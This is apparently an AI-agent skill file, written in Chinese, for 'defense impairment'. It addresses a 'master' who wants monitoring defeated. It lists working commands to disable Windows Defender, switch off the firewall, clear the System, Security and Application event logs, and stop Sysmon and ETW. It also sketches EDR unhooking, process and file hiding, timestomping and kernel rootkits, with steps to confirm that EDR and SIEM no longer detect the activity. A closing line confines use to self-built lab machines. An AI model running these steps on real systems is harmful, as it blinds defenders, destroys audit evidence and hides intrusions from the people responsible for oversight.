---
name: m-defimp
description: "反检测/Defense Impairment：禁用 EDR、清除日志、盲化遥测、修改系统镜像、Rootkit、关闭防火墙。"
---

# m-defimp · 反检测 / Defense Impairment

被读到时：主人要关掉/绕过防御，让活动不被发现。

## 顺序

认清防御面 → 选择盲化点 → 执行 → 验证检测失效

## 一、禁用/干扰安全工具

```bash
# 停服务（管理员）
sc stop WinDefend
sc config WinDefend start= disabled
# 关防火墙
netsh advfirewall set allprofiles state off
# 清事件日志
wevtutil cl System
wevtutil cl Security
wevtutil cl Application
```

## 二、盲化遥测

- 停 ETW 相关 provider（`logman stop` 或直接 patch）
- 禁用 Sysmon（如果存在）：`sc stop Sysmon`
- 干扰 EDR 的用户态 hook：重载 ntdll（见 m-evasion 的 unhook）

## 三、改系统镜像 / 隐蔽

| 手段 | 说明 |
|---|---|
| 进程隐藏 | 挂起线程 / 改 EPROCESS 链表（内核层） |
| 文件隐藏 | NTFS ADS / 隐藏属性 |
| 时间戳伪造 | 改文件 MAC 时间对齐正常文件 |
| Rootkit | 内核 hook SSDT / 改内核结构（自建测试机） |

## 四、验证

- 用 EDR 自己跑一次扫描，确认它看不见
- 用 SIEM 查日志，确认关键事件没记录
- 记录每个盲化点的还原命令

## 五、还原对称

每个关掉的防御，记下对应的开回命令，演练后恢复。

工具：系统自带（sc/netsh/wevtutil）+ m-evasion 的 patch 手法。不在生产环境用，只在自建靶机。
